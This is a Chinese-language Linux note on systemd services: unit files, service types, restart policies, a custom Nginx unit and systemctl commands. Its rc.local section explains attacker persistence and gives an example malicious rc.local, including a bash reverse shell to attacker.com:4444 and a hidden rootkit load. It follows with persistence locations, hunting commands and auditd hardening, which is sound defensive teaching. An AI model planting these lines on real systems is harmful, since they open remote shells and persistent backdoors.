# Linux 服务管理

> 让程序以服务形式运行——开机自启、崩溃重启、统一管理。包管理器安装的直接用 systemctl，源码编译的需要手写 unit 文件。

---

## 两种安装方式的服务管理对比

| | 包管理器安装（apt/dnf） | 源码编译安装 |
|---|---|---|
| 安装路径 | `/usr/bin/`、`/etc/` 等标准路径 | 通常 `/usr/local/` 或自定义 `--prefix` |
| systemd unit 文件 | 安装时自动生成 | 需要手写 |
| 管理方式 | `systemctl start/stop/enable 服务名` | 手写 unit → `systemctl daemon-reload` → 同样用 systemctl |
| 卸载 | `apt remove` / `dnf remove` | `make uninstall` 或手动删除 |
| 典型例子 | `systemctl start nginx` | 自己编译的 Redis、Nginx、Go 程序 |

核心原则：不管怎么装的，最终都是交给 systemd 管。包管理器帮你写了 unit 文件，源码安装需要你自己写。

---

## systemd unit 文件

### unit 文件位置

```bash
# 系统服务（包管理器安装的放这里）
/etc/systemd/system/           # 优先级最高，管理员手写的放这里
/usr/lib/systemd/system/       # 包管理器默认放这里（CentOS/RHEL）

# 用户服务（不需要 root）
~/.config/systemd/user/
```

`/etc/systemd/system/` 优先级高于 `/usr/lib/systemd/system/`，同名 unit 前者覆盖后者。

### unit 文件结构

```ini
[Unit]
Description=My Custom Service           # 服务描述
Documentation=https://example.com/docs  # 文档链接（可选）
After=network.target                    # 在网络就绪后启动
Before=shutdown.target                  # 在关机前停止

[Service]
Type=simple                             # 服务类型，见下表
User=myapp                              # 以哪个用户运行（不要用 root）
Group=myapp                             # 运行组
WorkingDirectory=/opt/myapp             # 工作目录
ExecStart=/opt/myapp/bin/server         # 启动命令
ExecStop=/bin/kill -TERM $MAINPID       # 停止命令
ExecReload=/bin/kill -HUP $MAINPID      # 重载配置命令
Restart=on-failure                      # 异常退出时自动重启
RestartSec=5                            # 重启前等待秒数
StandardOutput=journal                  # 标准输出写入 systemd 日志
StandardError=journal                   # 标准错误写入 systemd 日志
EnvironmentFile=/etc/myapp/env.conf     # 环境变量文件
Environment="PORT=8080"                 # 直接设置环境变量

[Install]
WantedBy=multi-user.target              # 在多用户模式下启动（等同于运行级别 3）
```

### Service Type

| Type | 说明 | 适用场景 |
|------|------|---------|
| `simple` | 默认值。ExecStart 启动的进程就是主进程，不会 fork | 大多数现代应用（Go、Node、Python） |
| `forking` | 主进程 fork 后退出，子进程成为守护进程 | 传统守护进程（Nginx、Redis 旧版） |
| `oneshot` | 执行一次性任务后退出，systemd 等待进程退出再继续 | 初始化脚本、数据库迁移 |
| `notify` | 启动完成后主动通知 systemd（通过 sd_notify） | 启动较慢的应用，确保就绪后才被依赖 |
| `idle` | 等所有其他任务完成后才启动 | 批处理任务，不阻塞关键服务 |

选错 type 的后果：systemd 不知道服务是否真正启动成功，可能出现"systemctl 显示 active 但实际挂了"。

### Restart 策略

| 值 | 行为 |
|---|------|
| `no` | 不自动重启（默认） |
| `always` | 无论什么原因退出都重启（包括正常退出） |
| `on-success` | 只有正常退出（退出码 0）才重启 |
| `on-failure` | 异常退出（非 0 退出码、信号终止、超时）才重启（推荐） |
| `on-abnormal` | 只有被信号杀死或超时才重启 |
| `on-watchdog` | 看门狗超时才重启 |

---

## 源码编译后配置服务

以编译安装 Nginx 为例。

### 1. 编译安装

```bash
wget http://nginx.org/download/nginx-1.24.0.tar.gz
tar -xzf nginx-1.24.0.tar.gz
cd nginx-1.24.0
./configure --prefix=/usr/local/nginx
make
sudo make install
```

### 2. 写 unit 文件

```bash
sudo vim /etc/systemd/system/nginx.service
```

```ini
[Unit]
Description=NGINX - Custom Build
After=network.target

[Service]
Type=forking
PIDFile=/usr/local/nginx/logs/nginx.pid
ExecStart=/usr/local/nginx/sbin/nginx
ExecReload=/usr/local/nginx/sbin/nginx -s reload
ExecStop=/usr/local/nginx/sbin/nginx -s quit
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
```

### 3. 启用来管理

```bash
sudo systemctl daemon-reload          # 重载 unit 文件
sudo systemctl start nginx            # 启动
sudo systemctl enable nginx           # 开机自启
sudo systemctl status nginx           # 验证
```

---

## systemctl 常用命令速查

```bash
# 启停
systemctl start 服务名
systemctl stop 服务名
systemctl restart 服务名
systemctl reload 服务名              # 重载配置（不重启进程）
systemctl reload-or-restart 服务名    # 支持 reload 则 reload，否则 restart

# 自启
systemctl enable 服务名               # 开机自启
systemctl disable 服务名              # 取消自启
systemctl is-enabled 服务名           # 查询是否自启

# 状态
systemctl status 服务名
systemctl is-active 服务名            # 是否运行中
systemctl list-units --type=service   # 列出所有 service
systemctl list-units --state=failed   # 列出启动失败的
systemctl list-unit-files --state=enabled  # 列出所有开机自启的

# 日志
journalctl -u 服务名
journalctl -u 服务名 -f               # 实时跟踪
journalctl -u 服务名 --since today     # 今天的日志

# unit 文件操作
systemctl daemon-reload               # 修改 unit 文件后执行
systemctl cat 服务名                   # 查看 unit 文件内容
systemctl edit --full 服务名           # 编辑 unit 文件
systemctl show 服务名                  # 显示所有属性
systemctl mask 服务名                  # 禁止启动（创建指向 /dev/null 的软链接）
systemctl unmask 服务名                # 解除 mask
```

---

## /etc/rc.local

### 历史背景

`rc.local` 是 System V init 时代的产物——系统启动脚本执行完毕后，最后执行这个文件中的命令。有了 systemd 后，systemd 提供了一个兼容层：`rc-local.service`，它会在启动时读取 `/etc/rc.local` 并执行。

```bash
# systemd 的 rc-local 兼容服务
systemctl status rc-local
# 通常默认未启用，需要手动开启
sudo systemctl enable rc-local
```

### 攻击者为什么喜欢它

`/etc/rc.local` 对于攻击者有天然的吸引力：

1. **开机自启**：系统启动时自动执行，重启后木马不会中断
2. **shell 脚本**：不编译、不链接，直接写命令即可
3. **隐蔽性尚可**：很多管理员很少检查这个文件
4. **无进程残留特征**：不是独立进程，不易被 `systemctl list-units` 列出来
5. **优先级较低**：在 systemd 服务之后执行，不容易干扰系统启动引发告警

攻击者可能在 `/etc/rc.local` 中写入：

```bash
#!/bin/bash

# 看起来无害甚至不可见的恶意指令
/usr/share/icons/.cache/sshd-backdoor &
nohup python3 -m http.server 8888 &> /dev/null &

# 反弹 shell
/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1 &

# 内核模块后门
insmod /lib/modules/.hidden/rootkit.ko
```

### 其他开机自启的持久化位置

攻击者不止会用 `rc.local`，常见的持久化路径：

| 位置 | 说明 |
|------|------|
| `/etc/rc.local` | 传统启动脚本（需要执行权限 + `#!/bin/bash`） |
| `/etc/crontab` | 系统的 crontab，可写 `@reboot /path/to/malware` |
| `crontab -e` | 用户 crontab，同上 |
| `/etc/systemd/system/*.service` | 伪装的 systemd 服务 |
| `~/.bashrc` / `~/.bash_profile` | 用户登录时触发（不是开机，但效果类似） |
| `/etc/profile` | 全局 shell 初始化脚本 |
| `/etc/init.d/*` | SysV init 脚本（兼容模式） |
| `~/.config/autostart/*.desktop` | 桌面环境自启（GUI 环境） |
| `/etc/ld.so.preload` | 动态链接库预加载——劫持所有动态链接程序 |

### 排查方法

```bash
# 1. 检查 rc.local 内容
cat /etc/rc.local            # 是否存在、是否可疑
stat /etc/rc.local           # 查看修改时间，异常时间点提升怀疑

# 2. 列出所有开机自启的 systemd 服务
systemctl list-unit-files --state=enabled

# 3. 检查所有用户的 crontab
cat /etc/crontab
for user in $(cut -d: -f1 /etc/passwd); do
    crontab -u "$user" -l 2>/dev/null && echo "--- $user ---"
done

# 4. 检查不常见的自启路径
cat /etc/profile
cat ~/.bashrc
cat /etc/ld.so.preload 2>/dev/null
ls -la ~/.config/autostart/

# 5. 用 find 查找最近修改过的可疑脚本
find /etc/ -type f -name "*.sh" -mtime -7
find /usr/local/ -type f -executable -mtime -7
```

### 加固建议

```bash
# 1. 移除 rc.local 的执行权限（如果不需要）
sudo chmod -x /etc/rc.local

# 2. 用 auditd 监控敏感路径的写入操作
sudo auditctl -w /etc/rc.local -p wa -k rc_local_change
sudo auditctl -w /etc/crontab -p wa -k cron_change
sudo auditctl -w /etc/systemd/system/ -p wa -k systemd_unit_change

# 3. 定期对比自启服务列表的基线
systemctl list-unit-files --state=enabled > /var/log/baseline_services_$(date +%Y%m%d).txt
```

---

## 参考

- [权限管理](权限管理.md) — 服务相关的文件权限、chattr、SELinux
- [Linux运维](Linux运维.md) — 系统运维命令速查
- [systemd 官方文档](https://systemd.io/)
- [systemd.service(5)](https://www.freedesktop.org/software/systemd/man/systemd.service.html)

---

## 简单总结

```
包管理器安装的 → systemctl start/stop/enable 直接用

源码编译安装的 → 手写 /etc/systemd/system/xxx.service
                  → systemctl daemon-reload
                  → 和上面一样用 systemctl 管理

rc.local        → systemd 兼容层仍可用，但不推荐
                  → 攻击者喜欢用它做持久化
                  → 排查时必看
```
